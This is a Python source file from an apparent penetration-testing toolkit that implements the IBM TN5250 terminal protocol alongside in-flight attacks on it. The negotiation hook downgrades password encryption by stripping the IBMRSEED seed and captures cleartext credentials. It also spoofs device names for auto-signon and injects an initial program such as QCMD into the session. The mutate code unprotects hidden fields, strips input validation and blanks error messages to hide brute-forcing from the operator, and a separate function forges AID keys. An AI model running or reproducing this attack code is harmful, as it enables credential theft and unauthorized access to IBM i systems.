"""
TN5250 protocol implementation.

The first publicly-available 5250 datastream parser written for security
testing. Hand-rolled from:
  - Wireshark packet-tn5250.c (byte layouts)
  - lib5250/codes5250.h (constants)
  - RFC 1205 (10-byte header)
  - RFC 2877 (NEW-ENVIRON USERVARs)

Implements hackterm_core.Protocol so attack code is protocol-agnostic.
"""
import logging
from typing import Optional

from hackterm_core import (
    Protocol, Screen, Field, FieldWrite, MutateOpts, NegotiateOpts,
    EbcdicCodec,
)
from hack5250.constants import (
    HDR_LEN, ESC,
    CMD_WRITE_TO_DISPLAY, CMD_CLEAR_UNIT, CMD_CLEAR_UNIT_ALT,
    CMD_WRITE_STRUCTURED, CMD_WRITE_ERROR_CODE,
    ORD_SOH, ORD_RA, ORD_EA, ORD_TD, ORD_SBA, ORD_IC, ORD_MC, ORD_SF, ORD_WEA,
    FFW_ID, FFW_ID_MASK, FFW_BYPASS, FFW_MDT, FFW_SHIFT_MASK,
    FFW_MAND_ENTRY, FFW_FER,
    SHIFT_NUMERIC_ONLY, SHIFT_DIGITS_ONLY, SHIFT_SIGNED_NUMERIC,
    FCW_ID, FCW_ID_MASK,
    FCW_SELFCHECK_MOD10, FCW_SELFCHECK_MOD11, FCW_NOOP,
    ATTR_GREEN, ATTR_WHITE, NONDISP_ATTRS,
    AID_TABLE,
    OPCODE_PUT_GET, HDR_FLAG_ATN,
    IAC, SE, IAC_EOR,
    TELOPT_NEW_ENVIRON, NE_USERVAR, NE_VALUE, NE_SEND, NE_IS,
    USERVAR_IBMRSEED, USERVAR_DEVNAME, USERVAR_IBMSUBSPW, USERVAR_USER,
    USERVAR_IBMPROGRAM, USERVAR_IBMIMENU, USERVAR_IBMCURLIB,
)


_log = logging.getLogger(__name__)


class TN5250(Protocol):
    name = "tn5250"
    aid_table = AID_TABLE
    default_codepage = "cp037"

    def __init__(self, codepage: str = "cp037"):
        self.codec = EbcdicCodec(codepage)
        # Negotiation-attack state
        self._stripped_seed: Optional[bytes] = None
        self.captured_creds: list[tuple[str, str]] = []  # (user, password)
        # Phase 3 A2: USERVAR injection (set by API/MCP, read by negotiate_hook)
        self.inject_initial_program: Optional[str] = None  # → IBMPROGRAM (e.g. "QCMD")
        self.inject_initial_menu: Optional[str] = None     # → IBMIMENU
        self.inject_current_library: Optional[str] = None  # → IBMCURLIB
        # E2: suppress Write Error Code text (blank with 0x40). Hides
        # "Password not correct" / "INVALID SUPERVISOR CODE" from the
        # operator during brute-force. Set via API; not in MutateOpts
        # (that's hackterm-core, no core changes).
        self.suppress_errors: bool = False

    # ==================================================================
    # Protocol.detect — telnet handshake recognition
    # ==================================================================

    def detect(self, first_bytes: bytes) -> bool:
        """5250 negotiates via NEW-ENVIRON (option 0x27) with IBM-specific
        USERVARs. Also accepts terminal types like IBM-3179-2, IBM-5251-11.

        Heuristic: see NEW-ENVIRON option byte OR see 'IBM-' followed by
        a 5xxx/3179 model number in the terminal-type negotiation.
        """
        if bytes([IAC, 0xFD, TELOPT_NEW_ENVIRON]) in first_bytes:  # IAC DO NEW-ENVIRON
            return True
        if bytes([IAC, 0xFB, TELOPT_NEW_ENVIRON]) in first_bytes:  # IAC WILL NEW-ENVIRON
            return True
        # Terminal-type announcement (ASCII at telnet layer)
        for marker in (b"IBM-3179", b"IBM-5251", b"IBM-5291", b"IBM-5292", b"IBM-3477"):
            if marker in first_bytes:
                return True
        return False

    # ==================================================================
    # Protocol.parse — outbound (host → terminal) datastream
    # ==================================================================

    def parse(self, data: bytes) -> Screen:
        screen = Screen.empty(rows=24, cols=80)
        screen.raw = data
        screen.pf_mask = 0xFFFFFF  # default: all keys valid (no SOH seen)

        if len(data) < HDR_LEN:
            return screen

        pos = HDR_LEN
        end = len(data)

        # Trim IAC EOR if present
        if end >= 2 and data[end-2:end] == IAC_EOR:
            end -= 2

        cur_row, cur_col = 1, 1

        while pos < end:
            # Look for ESC + command
            if data[pos] != ESC:
                pos += 1
                continue
            if pos + 1 >= end:
                break
            cmd = data[pos + 1]
            pos += 2

            if cmd in (CMD_CLEAR_UNIT, CMD_CLEAR_UNIT_ALT):
                screen.fields = []
                screen.rendered = [[" "] * screen.cols for _ in range(screen.rows)]
                cur_row, cur_col = 1, 1

            elif cmd == CMD_WRITE_TO_DISPLAY:
                # 2 control characters follow (CC1, CC2)
                pos += 2
                pos, cur_row, cur_col = self._parse_wtd_orders(
                    data, pos, end, screen, cur_row, cur_col
                )

            elif cmd == CMD_WRITE_ERROR_CODE:
                # Error code goes to the error line (row 24 typically). Skip for now.
                # Format: text bytes until next ESC or end
                while pos < end and data[pos] != ESC:
                    pos += 1

            elif cmd == CMD_WRITE_STRUCTURED:
                # Structured field: 2-byte length follows
                if pos + 2 <= end:
                    sf_len = (data[pos] << 8) | data[pos + 1]
                    pos += sf_len  # skip entire SF for now
                else:
                    break

            # Other commands (READ_*, SAVE/RESTORE_SCREEN) have no body to parse here

        return screen

    def _parse_wtd_orders(self, data: bytes, pos: int, end: int,
                          screen: Screen, cur_row: int, cur_col: int):
        """Walk Write-to-Display orders until next ESC or end."""
        while pos < end:
            b = data[pos]

            if b == ESC:
                break

            if b == IAC:
                # Doubled IAC (0xFF 0xFF) = telnet escape for literal 0xFF.
                # Raw packets in the log DB still contain telnet IAC doubling
                # per RFC 854. Skip both bytes and continue parsing.
                if pos + 1 < end and data[pos + 1] == IAC:
                    pos += 2
                    continue
                # Lone IAC (e.g. preceding EOR) = end of record.
                break

            elif b == ORD_SOH:
                # SOH + len(1) + flags(1) + resv(1) + resv(1) + err_row(1) + pf_mask(3)
                if pos + 1 >= end:
                    break
                soh_len = data[pos + 1]
                # pf_mask is the LAST 3 bytes of the SOH body
                if pos + 2 + soh_len <= end and soh_len >= 3:
                    mask_off = pos + 2 + soh_len - 3
                    screen.pf_mask = (
                        (data[mask_off] << 16) |
                        (data[mask_off + 1] << 8) |
                        data[mask_off + 2]
                    )
                pos += 2 + soh_len

            elif b == ORD_SBA:
                if pos + 2 >= end:
                    break
                cur_row = data[pos + 1]
                cur_col = data[pos + 2]
                pos += 3

            elif b == ORD_IC or b == ORD_MC:
                # Insert/Move Cursor: row + col follow. Doesn't change cur_row/col
                # for field positioning, just records cursor.
                pos += 3

            elif b == ORD_RA:
                # Repeat to Address: row + col + char
                if pos + 3 >= end:
                    break
                to_row, to_col, fill = data[pos+1], data[pos+2], data[pos+3]
                self._fill(screen, cur_row, cur_col, to_row, to_col, fill)
                cur_row, cur_col = to_row, to_col
                pos += 4

            elif b == ORD_EA:
                # Erase to Address: row + col + attr
                pos += 4

            elif b == ORD_TD:
                # Transparent Data: 2-byte length + raw bytes. DO NOT PARSE.
                if pos + 2 >= end:
                    break
                td_len = (data[pos+1] << 8) | data[pos+2]
                pos += 3 + td_len

            elif b == ORD_WEA:
                # Write Extended Attribute: 2 bytes follow (attr type + value)
                pos += 3

            elif b == ORD_SF:
                pos += 1
                field, pos = self._parse_sf(data, pos, end, cur_row, cur_col)
                if field is not None:
                    # Report field at the input position (col after attr byte).
                    # The attr byte occupies cur_col; the actual input starts
                    # at cur_col + 1. Without this, subfile selection fields
                    # report col 1 when actual input requires col 2.
                    field.col = cur_col + 1
                    field.row = cur_row
                    if field.col > screen.cols:
                        field.col = 1
                        field.row += 1
                    screen.fields.append(field)
                # The attr byte itself takes one screen position
                cur_col += 1
                if cur_col > screen.cols:
                    cur_col = 1
                    cur_row += 1

            elif 0x20 <= b <= 0x3F:
                # Standalone screen attribute byte — applies to following text.
                # Takes one screen position.
                cur_col += 1
                pos += 1

            else:
                # Text byte — render to grid
                if 1 <= cur_row <= screen.rows and 1 <= cur_col <= screen.cols:
                    screen.rendered[cur_row - 1][cur_col - 1] = self.codec.to_ascii(bytes([b]))
                cur_col += 1
                if cur_col > screen.cols:
                    cur_col = 1
                    cur_row += 1
                pos += 1

        return pos, cur_row, cur_col

    def _parse_sf(self, data: bytes, pos: int, end: int, row: int, col: int):
        """Parse a Start-of-Field order body.

        Structure after 0x1D:
          [FFW: 2 bytes]   if (word & 0xC000) == 0x4000
          [FCW: 2 bytes]*  while (word & 0xC000) == 0x8000
          attr: 1 byte
          length: 2 bytes (big-endian)

        Returns (Field, new_pos) or (None, pos) on truncation.
        """
        ffw = None

        # Check for FFW
        if pos + 2 <= end:
            word = (data[pos] << 8) | data[pos + 1]
            if (word & FFW_ID_MASK) == FFW_ID:
                ffw = word
                pos += 2
                # Skip any FCWs
                while pos + 2 <= end:
                    word = (data[pos] << 8) | data[pos + 1]
                    if (word & FCW_ID_MASK) == FCW_ID:
                        pos += 2
                    else:
                        break

        # attr (1) + length (2)
        if pos + 3 > end:
            return None, pos
        attr = data[pos]
        flen = (data[pos + 1] << 8) | data[pos + 2]
        pos += 3

        # Decode FFW bits
        if ffw is not None:
            protected = bool(ffw & FFW_BYPASS)
            mdt = bool(ffw & FFW_MDT)
            shift = ffw & FFW_SHIFT_MASK
            numeric = shift in (SHIFT_NUMERIC_ONLY, SHIFT_DIGITS_ONLY, SHIFT_SIGNED_NUMERIC)
        else:
            # No FFW = output-only field = implicitly protected
            protected = True
            mdt = False
            numeric = False

        hidden = attr in NONDISP_ATTRS

        return Field(
            row=row, col=col, length=flen,
            protected=protected, hidden=hidden, numeric=numeric, mdt=mdt,
            content=b"",  # filled by caller from following text bytes if needed
        ), pos

    def _fill(self, screen: Screen, from_row, from_col, to_row, to_col, fill_byte):
        """Implement RA (Repeat to Address)."""
        ch = self.codec.to_ascii(bytes([fill_byte]))
        r, c = from_row, from_col
        while (r, c) != (to_row, to_col):
            if 1 <= r <= screen.rows and 1 <= c <= screen.cols:
                screen.rendered[r - 1][c - 1] = ch
            c += 1
            if c > screen.cols:
                c = 1
                r += 1
                if r > screen.rows:
                    break

    # ==================================================================
    # Protocol.negotiate_hook — RFC 2877 negotiation manipulation
    # ==================================================================

    def negotiate_hook(self, data: bytes, direction: str,
                       opts: NegotiateOpts) -> bytes:
        """RFC 2877 negotiation manipulation.

        IBMRSEED downgrade (force_cleartext, s2c only):
          Server sends: IAC SB NEW-ENVIRON SEND USERVAR "IBMRSEED" <8-byte-seed> ...
          We strip the 8 seed bytes. Client receives empty IBMRSEED, falls
          back to sending IBMSUBSPW in cleartext per RFC 2877 §5.

        DEVNAME spoof (spoof_device_name, c2s only):
          Client sends: ... USERVAR "DEVNAME" VALUE "QPADEV0001" ...
          We rewrite the value. If the IBM i has device descriptions tied
          to user profiles (CRTDEVDSP USRPRF(...)), spoofing yields auto-signon.

        Cleartext capture (force_cleartext, c2s only):
          After we stripped the seed, watch for USERVAR "IBMSUBSPW" VALUE
          coming back from the client. Log the credential.
        """
        # --- s2c: strip IBMRSEED seed -------------------------------------
        if direction == "s2c" and opts.force_cleartext:
            marker = bytes([NE_USERVAR]) + USERVAR_IBMRSEED
            idx = data.find(marker)
            if idx != -1:
                seed_start = idx + len(marker)
                # The seed is the next 8 bytes (before next USERVAR/VAR or IAC)
                if seed_start + 8 <= len(data):
                    self._stripped_seed = data[seed_start:seed_start + 8]
                    _log.info("IBMRSEED seed stripped: %s",
                              self._stripped_seed.hex())
                    data = data[:seed_start] + data[seed_start + 8:]

        # --- c2s: capture cleartext password ------------------------------
        if (direction == "c2s" and opts.force_cleartext
                and self._stripped_seed is not None):
            user = self._extract_uservar_value(data, USERVAR_USER)
            password = self._extract_uservar_value(data, USERVAR_IBMSUBSPW)
            if password is not None:
                self.captured_creds.append((user or "?", password))
                _log.info("Captured cleartext credential: user=%s", user)

        # --- c2s: rewrite DEVNAME -----------------------------------------
        if direction == "c2s" and opts.spoof_device_name:
            marker = bytes([NE_USERVAR]) + USERVAR_DEVNAME + bytes([NE_VALUE])
            idx = data.find(marker)
            if idx != -1:
                val_start = idx + len(marker)
                # Find end of value (next USERVAR/VAR/IAC byte)
                val_end = val_start
                while val_end < len(data) and data[val_end] not in (
                        NE_USERVAR, 0x00, IAC):
                    val_end += 1
                new_val = opts.spoof_device_name.encode("ascii")
                data = data[:val_start] + new_val + data[val_end:]

        # --- c2s: inject IBMPROGRAM/IBMIMENU/IBMCURLIB --------------------
        # Phase 3 A2. These USERVARs override the user profile's INLPGM/
        # INLMNU/CURLIB at the Telnet-server level — processed BEFORE
        # QDSIGNON loads. Operator types valid creds → lands at our program.
        # Splice point: just before IAC SE (the subnegotiation terminator).
        if direction == "c2s":
            injections: list[tuple[bytes, Optional[str]]] = [
                (USERVAR_IBMPROGRAM, self.inject_initial_program),
                (USERVAR_IBMIMENU,   self.inject_initial_menu),
                (USERVAR_IBMCURLIB,  self.inject_current_library),
            ]
            for varname, value in injections:
                if value is None:
                    continue
                se_pos = data.rfind(bytes([IAC, SE]))
                if se_pos == -1:
                    break  # not a subnegotiation — nothing to splice into
                payload = (bytes([NE_USERVAR]) + varname +
                           bytes([NE_VALUE]) + value.encode("ascii"))
                data = data[:se_pos] + payload + data[se_pos:]
                _log.info("Injected %s=%s into NEW-ENVIRON",
                          varname.decode("ascii"), value)

        return data

    @staticmethod
    def _extract_uservar_value(data: bytes, varname: bytes) -> Optional[str]:
        """Find USERVAR <varname> VALUE <...> and extract the value as ASCII."""
        marker = bytes([NE_USERVAR]) + varname + bytes([NE_VALUE])
        idx = data.find(marker)
        if idx == -1:
            return None
        val_start = idx + len(marker)
        val_end = val_start
        while val_end < len(data) and data[val_end] not in (NE_USERVAR, 0x00, IAC):
            val_end += 1
        return data[val_start:val_end].decode("ascii", errors="replace")

    # ==================================================================
    # Protocol.mutate — in-flight FFW manipulation (THE NOVEL ATTACK)
    # ==================================================================

    def mutate(self, data: bytes, opts: MutateOpts) -> bytes:
        """In-flight FFW manipulation.

        Walks the same structure as parse() but mutates a bytearray copy.
        Never changes packet length — all mutations are byte-rewrites.
        """
        if not any([opts.unprotect, opts.reveal_hidden, opts.remove_numeric,
                    self.suppress_errors]):
            return data  # nothing to do (high_visibility/color_reveal alone are no-ops)

        out = bytearray(data)
        if len(out) < HDR_LEN:
            return bytes(out)

        pos = HDR_LEN
        end = len(out)
        if end >= 2 and out[end-2:end] == IAC_EOR:
            end -= 2

        while pos < end:
            if out[pos] != ESC:
                pos += 1
                continue
            if pos + 1 >= end:
                break
            cmd = out[pos + 1]
            pos += 2

            if cmd == CMD_WRITE_TO_DISPLAY:
                pos += 2  # CC1, CC2
                pos = self._mutate_wtd_orders(out, pos, end, opts)
            elif cmd == CMD_WRITE_ERROR_CODE:
                # E2: blank the error text. Walk to next ESC or IAC,
                # replace each byte with EBCDIC space.
                if self.suppress_errors:
                    while pos < end and out[pos] not in (ESC, IAC):
                        out[pos] = 0x40
                        pos += 1
                else:
                    while pos < end and out[pos] not in (ESC, IAC):
                        pos += 1
            elif cmd == CMD_WRITE_STRUCTURED:
                if pos + 2 <= end:
                    sf_len = (out[pos] << 8) | out[pos + 1]
                    pos += sf_len
                else:
                    break
            # Other commands have no mutable body

        return bytes(out)

    def _mutate_wtd_orders(self, out: bytearray, pos: int, end: int,
                           opts: MutateOpts) -> int:
        """Walk WTD orders, mutating in place. Mirrors _parse_wtd_orders."""
        while pos < end:
            b = out[pos]

            if b == ESC:
                break

            if b == IAC:
                # Doubled IAC (0xFF 0xFF) = telnet escape for literal 0xFF.
                if pos + 1 < end and out[pos + 1] == IAC:
                    pos += 2
                    continue
                break

            elif b == ORD_SOH:
                if pos + 1 >= end:
                    break
                soh_len = out[pos + 1]
                # SOH PF-MASK rewrite REMOVED 2026-04-08 — caused X-SYSTEM
                # lock on the Java emulator. We were writing FFFFFF where
                # the host had 000000. The emulator either validated the
                # SOH body and rejected it, or the all-enabled mask
                # conflicted with the format table state. Either way:
                # mutate must not touch SOH. The PF-mask analysis (which
                # keys are masked) is still available via parse() →
                # screen.pf_mask → get_masked_keys() — that's read-only
                # and works fine. The "send all masked keys" attack still
                # works because we send AIDs the host doesn't expect; we
                # don't need to lie to the EMULATOR about what's valid.
                pos += 2 + soh_len

            elif b == ORD_SBA:
                pos += 3
            elif b in (ORD_IC, ORD_MC):
                pos += 3
            elif b == ORD_RA:
                pos += 4
            elif b == ORD_EA:
                pos += 4
            elif b == ORD_WEA:
                pos += 3

            elif b == ORD_TD:
                # CRITICAL: skip transparent data without parsing
                if pos + 2 >= end:
                    break
                td_len = (out[pos + 1] << 8) | out[pos + 2]
                pos += 3 + td_len

            elif b == ORD_SF:
                pos += 1
                pos = self._mutate_sf(out, pos, end, opts)

            elif 0x20 <= b <= 0x3F:
                # Standalone screen attribute
                if opts.reveal_hidden and b in NONDISP_ATTRS:
                    out[pos] = ATTR_WHITE if opts.high_visibility else ATTR_GREEN
                pos += 1

            else:
                pos += 1  # text byte

        return pos

    def _mutate_sf(self, out: bytearray, pos: int, end: int,
                   opts: MutateOpts) -> int:
        """Mutate the FFW and screen-attr inside a Start-of-Field.

        SF structure: [FFW(2)] [FCW(2)]* attr(1) len(2)

        SELECTIVE UNPROTECT (live finding 2026-04-08): clearing BYPASS on
        every protected field exploded the emulator's format table — 97
        fields went from output-only to tab stops, navigation broke.
        Now: only clear BYPASS on fields that are ALSO hidden (NONDISP).
        Visible protected fields are decorative output, not attack targets.
        This requires looking ahead past FCWs to the attr byte before
        deciding on the FFW mutation.
        """
        ffw_pos = None
        word = None

        # FFW present? Remember its position but don't mutate yet —
        # we need to see the attr byte first.
        if pos + 2 <= end:
            w = (out[pos] << 8) | out[pos + 1]
            if (w & FFW_ID_MASK) == FFW_ID:
                ffw_pos = pos
                word = w
                pos += 2
                # Walk FCWs — strip self-check (E1), skip the rest
                while pos + 2 <= end:
                    fcw = (out[pos] << 8) | out[pos + 1]
                    if (fcw & FCW_ID_MASK) != FCW_ID:
                        break
                    # E1: self-check FCW strip. Luhn/mod-11 validation is
                    # terminal-side — strip it and the emulator stops
                    # checking. Replace with FCW_NOOP (bare marker) instead
                    # of deleting — keeps length stable.
                    if opts.remove_numeric and fcw in (
                            FCW_SELFCHECK_MOD10, FCW_SELFCHECK_MOD11):
                        out[pos] = (FCW_NOOP >> 8) & 0xFF
                        out[pos + 1] = FCW_NOOP & 0xFF
                    pos += 2

        # Screen attribute byte — now we know whether the field is hidden
        attr = out[pos] if pos < end else 0
        is_hidden = attr in NONDISP_ATTRS

        # Now apply FFW mutations (we have the attr context)
        if ffw_pos is not None:
            # Unprotect: ONLY on hidden fields. Visible protected fields
            # are decorative output — making them tab stops breaks the
            # format table contract with the host.
            if opts.unprotect and is_hidden:
                word &= ~FFW_BYPASS
            # remove_numeric: unconditional. It changes input VALIDATION
            # (alpha-into-numeric), not format-table membership. Safe.
            if opts.remove_numeric:
                word &= ~FFW_SHIFT_MASK
                word &= ~FFW_MAND_ENTRY
                word &= ~FFW_FER
            out[ffw_pos] = (word >> 8) & 0xFF
            out[ffw_pos + 1] = word & 0xFF

        # Apply attr mutation
        if pos < end:
            if opts.reveal_hidden and is_hidden:
                out[pos] = ATTR_WHITE if opts.high_visibility else ATTR_GREEN
            pos += 1

        # Field length (2 bytes) — skip
        pos += 2
        return pos

    # ==================================================================
    # Protocol.build_inbound + spoof_aid — terminal → host packets
    # ==================================================================

    def build_inbound(self, aid: int, cursor: tuple[int, int],
                      fields: list[FieldWrite]) -> bytes:
        """Build a packet the terminal would send.

        5250 inbound structure:
          [10-byte header] cursor_row cursor_col AID [SBA row col data]* IAC EOR

        NOTE: cursor comes BEFORE aid (3270 has aid first). This is the
        single most error-prone difference between the protocols.
        """
        body = bytearray()
        body.append(cursor[0])  # row
        body.append(cursor[1])  # col
        body.append(aid)
        for fw in fields:
            body.append(ORD_SBA)
            body.append(fw.row)
            body.append(fw.col)
            body.extend(fw.data)

        # Header layout (verified against real emulator capture, log id 24
        # in ibmi_pentest.db, 2026-04-08):
        #   0-1: rec_len (HDR_LEN + body, NOT including IAC EOR)
        #   2-3: GDS type 12A0
        #   4-5: reserved (TWO bytes — we previously had only one, causing
        #        a one-byte left-shift of everything after)
        #   6:   var_hdr_len (always 04)
        #   7-8: flags (16-bit)
        #   9:   opcode
        rec_len = HDR_LEN + len(body)  # IAC EOR not counted
        hdr = bytearray(HDR_LEN)
        hdr[0] = (rec_len >> 8) & 0xFF
        hdr[1] = rec_len & 0xFF
        hdr[2] = 0x12
        hdr[3] = 0xA0
        # hdr[4], hdr[5] = 0x00, 0x00  -- reserved (bytearray default)
        hdr[6] = 0x04   # var_hdr_len
        # hdr[7], hdr[8] = 0x00, 0x00  -- flags (bytearray default)
        hdr[9] = OPCODE_PUT_GET

        return bytes(hdr) + bytes(body) + IAC_EOR

    def spoof_aid(self, original: bytes, new_aid: int) -> bytes:
        """Replace the AID byte in a captured inbound packet.

        5250 AID is at offset HDR_LEN + 2 (after cursor row + col).
        """
        aid_pos = HDR_LEN + 2
        if len(original) <= aid_pos:
            return original
        out = bytearray(original)
        out[aid_pos] = new_aid
        return bytes(out)
